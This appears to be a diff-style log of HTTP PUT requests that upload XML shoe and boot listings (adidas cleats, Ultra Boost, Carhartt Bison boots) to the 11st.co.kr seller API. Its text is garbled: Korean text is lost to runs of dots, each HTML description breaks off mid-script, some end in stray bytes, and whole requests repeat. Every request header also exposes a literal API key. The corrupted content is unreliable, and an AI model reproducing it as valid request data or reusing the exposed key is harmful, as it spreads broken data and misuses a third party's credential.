+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">adidas Mens adizero 5-Star 6.0 X Kevlar Army Dipped Football Cleats</div><div style="text-align:left;">PROD950006492</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Take the field in the revolutionary adizero 5-Star 6.0 X Kevlar Army Dipped. An engineered SPRINTSKIN&trade; upper delivers unmatched strength and support while a heel cup offers a locked down fit. The adidas&reg; adizero 5-star 6.0 x Kevlar&reg; Army Dipped football cleat has an upgraded Dupont&trade; Kevlar&reg; plate with sprint and bladed spikes that ensure superior lightweight traction and strength for a dominant performance.FEATURES:<br>SPRINTSKIN&trade; upper is a synthetic laminated package that provides superior support and a secure lightweight fit<br>Upper built with DuPont&trade Kevlar&reg; for added strength and stability<br>Heel cup locks your foot in place for added support and protection<br>5-STAR FRAME with sprint studs throughout the frame and reinforced with DuPont&trade; Kevlar&reg; ensures the exceptional lightweight flexibility, traction and multidirectional speed<br>DuPont&trade; and Kevlar&reg; are registered trademarks of E.I. du Pont de Nemours and Company and used under license by adidas.Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: adidas<br>Country of Origin: Imported<br>Style: BW0339, BW0340, BW0341, BW0699, B42503 <br>Web ID: 16ADIMDZR5STR60XKDLT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=pA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2211175172 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 10224
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123476]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.... Army adidas Mens adizero 5-Star 6.0 X Kevlar  Dipped Football Cleats/950006492 .... ....../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Army]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006492]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Army/950006492/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Army/950006492/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Army/950006492/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Army/950006492/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">adidas Mens adizero 5-Star 6.0 X Kevlar Army Dipped Football Cleats</div><div style="text-align:left;">PROD950006492</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Take the field in the revolutionary adizero 5-Star 6.0 X Kevlar Army Dipped. An engineered SPRINTSKIN&trade; upper delivers unmatched strength and support while a heel cup offers a locked down fit. The adidas&reg; adizero 5-star 6.0 x Kevlar&reg; Army Dipped football cleat has an upgraded Dupont&trade; Kevlar&reg; plate with sprint and bladed spikes that ensure superior lightweight traction and strength for a dominant performance.FEATURES:<br>SPRINTSKIN&trade; upper is a synthetic laminated package that provides superior support and a secure lightweight fit<br>Upper built with DuPont&trade Kevlar&reg; for added strength and stability<br>Heel cup locks your foot in place for added support and protection<br>5-STAR FRAME with sprint studs throughout the frame and reinforced with DuPont&trade; Kevlar&reg; ensures the exceptional lightweight flexibility, traction and multidirectional speed<br>DuPont&trade; and Kevlar&reg; are registered trademarks of E.I. du Pont de Nemours and Company and used under license by adidas.Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: adidas<br>Country of Origin: Imported<br>Style: BW0339, BW0340, BW0341, BW0699, B42503 <br>Web ID: 16ADIMDZR5STR60XKDLT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2211175151 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 10224
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123476]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.... Army adidas Mens adizero 5-Star 6.0 X Kevlar  Dipped Football Cleats/950006496 .... ....../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Army]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006496]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Army/950006496/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Army/950006496/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Army/950006496/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Army/950006496/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">adidas Mens adizero 5-Star 6.0 X Kevlar Army Dipped Football Cleats</div><div style="text-align:left;">PROD950006496</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Take the field in the revolutionary adizero 5-Star 6.0 X Kevlar Army Dipped. An engineered SPRINTSKIN&trade; upper delivers unmatched strength and support while a heel cup offers a locked down fit. The adidas&reg; adizero 5-star 6.0 x Kevlar&reg; Army Dipped football cleat has an upgraded Dupont&trade; Kevlar&reg; plate with sprint and bladed spikes that ensure superior lightweight traction and strength for a dominant performance.FEATURES:<br>SPRINTSKIN&trade; upper is a synthetic laminated package that provides superior support and a secure lightweight fit<br>Upper built with DuPont&trade Kevlar&reg; for added strength and stability<br>Heel cup locks your foot in place for added support and protection<br>5-STAR FRAME with sprint studs throughout the frame and reinforced with DuPont&trade; Kevlar&reg; ensures the exceptional lightweight flexibility, traction and multidirectional speed<br>DuPont&trade; and Kevlar&reg; are registered trademarks of E.I. du Pont de Nemours and Company and used under license by adidas.Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: adidas<br>Country of Origin: Imported<br>Style: BW0339, BW0340, BW0341, BW0699, B42503 <br>Web ID: 16ADIMDZR5STR60XKDLT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=p?}??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2211175151 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 10224
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123476]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.... Army adidas Mens adizero 5-Star 6.0 X Kevlar  Dipped Football Cleats/950006496 .... ....../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Army]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006496]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Army/950006496/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Army/950006496/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Army/950006496/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Army/950006496/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">adidas Mens adizero 5-Star 6.0 X Kevlar Army Dipped Football Cleats</div><div style="text-align:left;">PROD950006496</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Take the field in the revolutionary adizero 5-Star 6.0 X Kevlar Army Dipped. An engineered SPRINTSKIN&trade; upper delivers unmatched strength and support while a heel cup offers a locked down fit. The adidas&reg; adizero 5-star 6.0 x Kevlar&reg; Army Dipped football cleat has an upgraded Dupont&trade; Kevlar&reg; plate with sprint and bladed spikes that ensure superior lightweight traction and strength for a dominant performance.FEATURES:<br>SPRINTSKIN&trade; upper is a synthetic laminated package that provides superior support and a secure lightweight fit<br>Upper built with DuPont&trade Kevlar&reg; for added strength and stability<br>Heel cup locks your foot in place for added support and protection<br>5-STAR FRAME with sprint studs throughout the frame and reinforced with DuPont&trade; Kevlar&reg; ensures the exceptional lightweight flexibility, traction and multidirectional speed<br>DuPont&trade; and Kevlar&reg; are registered trademarks of E.I. du Pont de Nemours and Company and used under license by adidas.Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: adidas<br>Country of Origin: Imported<br>Style: BW0339, BW0340, BW0341, BW0699, B42503 <br>Web ID: 16ADIMDZR5STR60XKDLT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/1945778910 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 44997
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020686]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[........ Adidas  Mens Ultra Boost Running Shoes/950007456 .... ...... ...... ...... ...... ........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Adidas]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950007456]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Adidas/950007456/600_600_GolfGalaxy_16ADIMLTRBSTMBLKWRNN_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Adidas/950007456/600_600_GolfGalaxy_16ADIMLTRBSTMBLKWRNN_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Adidas/950007456/600_600_GolfGalaxy_16ADIMLTRBSTMBLKWRNN_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Adidas/950007456/600_600_GolfGalaxy_16ADIMLTRBSTMBLKWRNN_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">adidas Mens Ultra Boost Running Shoes</div><div style="text-align:left;">PROD950007456</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Amp up your run with the adidas&reg; Men..s Ultra Boost running shoe. Designed with unique energy-returning boost&trade; technology, this technical running shoe features 20% more boost cushioning material than ever before.DESIGN:<br>Engineered mesh in upper for maximum breathabilityIN-SHOE COMFORT:<br>Energy-returning boost&trade; technology in the midsole to provide lightweight cushioning <br>Bootie construction wraps the foot and provides supportTRACTION & DURABILITY:<br>Rubber outsole has a grippy texture for better tractionADDITIONAL DETAILS:<br>Shoe type: Neutral<br>Weight: 10.6 ozProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: adidas<br>Country of Origin: United States of America or Imported <br>Web ID: 16ADIMLTRBSTMBLKWRNN function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 13:30:28</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solid #888888;margin-top:10px;margin-bottom:1px;"><div class="divColorName" style="border-bottom:1px solid #dfdfdf;padding:5px;texpA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/1945778910 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 44997
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020686]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[........ Adidas  Mens Ultra Boost Running Shoes/950007456 .... ...... ...... ...... ...... ........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Adidas]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950007456]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Adidas/950007456/600_600_GolfGalaxy_16ADIMLTRBSTMBLKWRNN_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Adidas/950007456/600_600_GolfGalaxy_16ADIMLTRBSTMBLKWRNN_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Adidas/950007456/600_600_GolfGalaxy_16ADIMLTRBSTMBLKWRNN_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Adidas/950007456/600_600_GolfGalaxy_16ADIMLTRBSTMBLKWRNN_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">adidas Mens Ultra Boost Running Shoes</div><div style="text-align:left;">PROD950007456</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Amp up your run with the adidas&reg; Men..s Ultra Boost running shoe. Designed with unique energy-returning boost&trade; technology, this technical running shoe features 20% more boost cushioning material than ever before.DESIGN:<br>Engineered mesh in upper for maximum breathabilityIN-SHOE COMFORT:<br>Energy-returning boost&trade; technology in the midsole to provide lightweight cushioning <br>Bootie construction wraps the foot and provides supportTRACTION & DURABILITY:<br>Rubber outsole has a grippy texture for better tractionADDITIONAL DETAILS:<br>Shoe type: Neutral<br>Weight: 10.6 ozProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: adidas<br>Country of Origin: United States of America or Imported <br>Web ID: 16ADIMLTRBSTMBLKWRNN function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 13:30:28</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solid #888888;margin-top:10px;margin-bottom:1px;"><div class="divColorName" style="border-bottom:1px solid #dfdfdf;padding:5px;tex
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2179174475 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 16320
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020747]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Carhartt  Mens Bison 8 Waterproof Work Boots/950003329 .... ..../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Carhartt]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950003329]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Carhartt/950003329/600_600_15CTTM8WRKBTBSNWPFBO_Bison_Brown_Oil_Tanned1.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Carhartt/950003329/600_600_15CTTM8WRKBTBSNWPFBO_Bison_Brown_Oil_Tanned1.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Carhartt/950003329/600_600_15CTTM8WRKBTBSNWPFBO_Bison_Brown_Oil_Tanned1.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Carhartt/950003329/600_600_15CTTM8WRKBTBSNWPFBO_Bison_Brown_Oil_Tanned1.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Carhartt Mens Bison 8 Waterproof Work Boots</div><div style="text-align:left;">PROD950003329</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>For ultimate workplace wear, step in.to the high-cut, high-performance Carhartt&reg; Men..s Bison 8'''' Waterproof work boot. The oil-tanned leather upper provides superior protection against on-the-job abrasions, while a waterproof interior membrane shields feet against the elements. A TPU stabilizer ensures a secure step, and the outsole maximizes traction on treacherously wet surfaces. For reliable workplace performance, lace up the Bison boot. FEATURES:<br>Oil-tanned leather upper delivers unmatched durability on tough jobs <br>Waterproof interior membrane protects feet against incoming moisture for lasting dryness <br>PU Strobel pad with PU cushion insole provides superior cushioning for lasting comfort <br>TPU stabilizer provides ultimate heel support for a secure step <br>Direct attached welt construction increases durability <br>Achillex flex join allows for a wide range of performance-based motion <br>Outsole maximizes traction on oil, chemicals, and other slippery surfaces <br>Meets ASTM 2892-11 EH standards for workplace wear <br>Height: 8'''' <br> Click here for additional information relating to the Manufacturer..s Warranty.Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Carhartt<br>Country of Origin: Imported<br>Style: CMW8100 <br>Web pA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2179174475 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 16320
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020747]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Carhartt  Mens Bison 8 Waterproof Work Boots/950003329 .... ..../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Carhartt]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950003329]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Carhartt/950003329/600_600_15CTTM8WRKBTBSNWPFBO_Bison_Brown_Oil_Tanned1.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Carhartt/950003329/600_600_15CTTM8WRKBTBSNWPFBO_Bison_Brown_Oil_Tanned1.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Carhartt/950003329/600_600_15CTTM8WRKBTBSNWPFBO_Bison_Brown_Oil_Tanned1.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Carhartt/950003329/600_600_15CTTM8WRKBTBSNWPFBO_Bison_Brown_Oil_Tanned1.jpg]]></prdImage04>
+.
